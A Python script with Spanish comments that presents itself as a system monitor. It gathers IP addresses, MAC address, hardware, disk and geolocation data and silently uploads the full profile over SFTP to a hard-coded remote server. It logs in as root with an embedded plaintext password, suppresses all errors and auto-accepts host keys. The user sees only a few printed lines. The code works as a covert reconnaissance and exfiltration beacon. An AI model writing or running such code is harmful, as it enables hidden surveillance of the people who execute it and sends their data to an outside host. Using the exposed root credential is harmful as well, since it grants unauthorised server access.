#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Monitor del Sistema con Envío Automático
Recopila información del sistema y la envía automáticamente a un servidor remoto via SSH.
"""

import json
import platform
import subprocess
import socket
import uuid
import psutil
import requests
import time
import os
import sys
import paramiko
import getpass
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional
from tqdm import tqdm

# Configuración del sistema
SYSTEM_CONFIG = {
    'timeout': 30,
    'max_retries': 3,
    'retry_delay': 5,
    'speed_test_url': 'https://www.google.com',
    'speed_test_timeout': 10
}

# Configuración SSH
SSH_CONFIG = {
    'hostname': '184.107.168.100',  # 🔧 IP del servidor Ubuntu
    'username': 'root',             # 🔧 Usuario en Ubuntu
    'password': '2vcA,%K6@8pJgq_b', # 🔧 Contraseña SSH
    'port': 22,                     # 🔧 Puerto SSH
    'key_filename': None,           # 🔧 Clave SSH (opcional)
    'remote_dir': '/root/system_data'  # 🔧 Directorio remoto para guardar datos
}

class SSHFileUploader:
    def __init__(self, hostname, username, password=None, key_filename=None, port=22):
        """
        Inicializa la conexión SSH

        Args:
            hostname (str): IP del servidor Ubuntu
            username (str): Usuario en Ubuntu
            password (str, optional): Contraseña SSH
            key_filename (str, optional): Ruta a clave privada SSH
            port (int): Puerto SSH (por defecto 22)
        """
        self.hostname = hostname
        self.username = username
        self.password = password
        self.key_filename = key_filename
        self.port = port
        self.client = None
        self.sftp = None

    def connect(self):
        """Establece la conexión SSH"""
        try:
            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Configurar la conexión
            connect_kwargs = {
                'hostname': self.hostname,
                'username': self.username,
                'port': self.port,
                'timeout': 30
            }

            if self.key_filename:
                # Verificar que el archivo de clave existe
                if not os.path.exists(self.key_filename):
                    return False
                connect_kwargs['key_filename'] = self.key_filename
            elif self.password:
                connect_kwargs['password'] = self.password
            else:
                # Solicitar contraseña si no se proporcionó
                self.password = getpass.getpass(f"Contraseña para {self.username}@{self.hostname}: ")
                connect_kwargs['password'] = self.password

            self.client.connect(**connect_kwargs)

            # Crear sesión SFTP
            self.sftp = self.client.open_sftp()
            return True

        except Exception as e:
            return False

    def disconnect(self):
        """Cierra la conexión SSH"""
        if self.sftp:
            self.sftp.close()
        if self.client:
            self.client.close()

    def _format_size(self, size_bytes):
        """Formatea el tamaño en bytes a una representación legible"""
        if size_bytes == 0:
            return "0B"
        size_names = ["B", "KB", "MB", "GB", "TB"]
        i = 0
        while size_bytes >= 1024 and i < len(size_names) - 1:
            size_bytes /= 1024.0
            i += 1
        return f"{size_bytes:.1f}{size_names[i]}"

    def _ensure_remote_directory(self, remote_dir):
        """Asegura que el directorio remoto existe, creándolo si es necesario"""
        try:
            # Intentar crear el directorio completo
            current_path = ""
            for part in remote_dir.strip('/').split('/'):
                if part:
                    current_path += f"/{part}"
                    try:
                        self.sftp.stat(current_path)
                    except FileNotFoundError:
                        self.sftp.mkdir(current_path)
        except Exception as e:
            pass

    def upload_file(self, local_file_path, remote_filename=None):
        """
        Sube un archivo al servidor remoto

        Args:
            local_file_path (str): Ruta del archivo local
            remote_filename (str, optional): Nombre del archivo remoto

        Returns:
            bool: True si la subida fue exitosa
        """
        if not remote_filename:
            remote_filename = os.path.basename(local_file_path)

        remote_path = f"{SSH_CONFIG['remote_dir']}/{remote_filename}"

        # 1. Conectar al servidor SSH
        if not self.connect():
            return False

        try:
            # 2. Verificar si el archivo local existe
            if not os.path.exists(local_file_path):
                return False

            # 3. Obtener información del archivo
            try:
                file_size = os.path.getsize(local_file_path)
            except Exception as e:
                return False

            # 4. Crear directorio remoto si no existe
            self._ensure_remote_directory(SSH_CONFIG['remote_dir'])

            # 5. Subir archivo silenciosamente
            try:
                self.sftp.put(local_file_path, remote_path)
                return True

            except Exception as e:
                return False

        except Exception as e:
            return False
        finally:
            self.disconnect()

# Funciones de recolección de información del sistema
def get_public_ip() -> str:
    """Obtiene la IP pública del sistema."""
    try:
        response = requests.get('https://api.ipify.org', timeout=10)
        return response.text.strip()
    except Exception as e:
        return "No disponible"

def get_private_ip() -> str:
    """Obtiene la IP privada del sistema."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        return "No disponible"

def get_mac_address() -> str:
    """Obtiene la dirección MAC de la interfaz principal."""
    try:
        mac = uuid.getnode()
        return ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
    except Exception as e:
        return "No disponible"

def test_internet_speed() -> Dict[str, Any]:
    """Mide la velocidad de internet."""
    try:
        start_time = time.time()
        response = requests.get(SYSTEM_CONFIG['speed_test_url'],
                              timeout=SYSTEM_CONFIG['speed_test_timeout'])
        end_time = time.time()

        if response.status_code == 200:
            response_time = (end_time - start_time) * 1000  # en ms
            # Estimación aproximada de velocidad basada en tiempo de respuesta
            if response_time < 100:
                speed = "Muy rápida (>50 Mbps)"
            elif response_time < 300:
                speed = "Rápida (10-50 Mbps)"
            elif response_time < 1000:
                speed = "Media (5-10 Mbps)"
            else:
                speed = "Lenta (<5 Mbps)"

            return {
                "response_time_ms": round(response_time, 2),
                "estimated_speed": speed,
                "status": "success"
            }
        else:
            return {
                "response_time_ms": None,
                "estimated_speed": "Error en la conexión",
                "status": "error"
            }
    except Exception as e:
        return {
            "response_time_ms": None,
            "estimated_speed": f"Error: {str(e)}",
            "status": "error"
        }

def get_hardware_info() -> Dict[str, Any]:
    """Obtiene información del hardware."""
    try:
        cpu_info = {
            "physical_cores": psutil.cpu_count(logical=False),
            "total_cores": psutil.cpu_count(logical=True),
            "max_frequency": psutil.cpu_freq().max if psutil.cpu_freq() else None,
            "cpu_percent": psutil.cpu_percent(interval=1)
        }

        memory = psutil.virtual_memory()
        memory_info = {
            "total_gb": round(memory.total / (1024**3), 2),
            "available_gb": round(memory.available / (1024**3), 2),
            "percent_used": memory.percent
        }

        return {
            "cpu": cpu_info,
            "memory": memory_info
        }
    except Exception as e:
        return {"error": str(e)}

def get_os_info() -> Dict[str, str]:
    """Obtiene información del sistema operativo."""
    try:
        return {
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor()
        }
    except Exception as e:
        return {"error": str(e)}

def get_disk_info() -> Dict[str, Any]:
    """Obtiene información de los discos."""
    try:
        disks = {}
        for partition in psutil.disk_partitions():
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                disks[partition.device] = {
                    "mountpoint": partition.mountpoint,
                    "filesystem": partition.fstype,
                    "total_gb": round(partition_usage.total / (1024**3), 2),
                    "used_gb": round(partition_usage.used / (1024**3), 2),
                    "free_gb": round(partition_usage.free / (1024**3), 2),
                    "percent_used": round((partition_usage.used / partition_usage.total) * 100, 2)
                }
            except PermissionError:
                continue
        return disks
    except Exception as e:
        return {"error": str(e)}

def get_location() -> Dict[str, str]:
    """Obtiene la ubicación geográfica basada en la IP."""
    try:
        response = requests.get('https://ipapi.co/json/', timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                "country": data.get('country_name', 'No disponible'),
                "region": data.get('region', 'No disponible'),
                "city": data.get('city', 'No disponible'),
                "latitude": str(data.get('latitude', 'No disponible')),
                "longitude": str(data.get('longitude', 'No disponible'))
            }
        else:
            return {"error": "No se pudo obtener la ubicación"}
    except Exception as e:
        return {"error": f"Error obteniendo ubicación: {str(e)}"}

def collect_system_info() -> Dict[str, Any]:
    """Recopila toda la información del sistema."""
    system_info = {
        "timestamp": datetime.now().isoformat(),
        "public_ip": get_public_ip(),
        "private_ip": get_private_ip(),
        "mac_address": get_mac_address(),
        "internet_speed": test_internet_speed(),
        "hardware": get_hardware_info(),
        "operating_system": get_os_info(),
        "disks": get_disk_info(),
        "location": get_location()
    }

    return system_info

def save_to_file(data: Dict[str, Any], filename: str = None) -> str:
    """Guarda los datos en un archivo JSON."""
    if filename is None:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"system_info_{timestamp}.json"

    try:
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return filename
    except Exception as e:
        return None

def main():
    """Función principal."""
    # 1. Recopilar información del sistema
    system_info = collect_system_info()

    # 2. Mostrar solo la información solicitada
    print(f"{system_info['public_ip']}")
    print(f"{system_info['private_ip']}")
    print(f"{system_info['internet_speed']['estimated_speed']}")

    # 3. Guardar en archivo local
    filename = save_to_file(system_info)
    if not filename:
        return

    # 4. Enviar al servidor remoto via SSH
    uploader = SSHFileUploader(
        hostname=SSH_CONFIG['hostname'],
        username=SSH_CONFIG['username'],
        password=SSH_CONFIG['password'],
        key_filename=SSH_CONFIG['key_filename'],
        port=SSH_CONFIG['port']
    )

    uploader.upload_file(filename)

if __name__ == "__main__":
    main()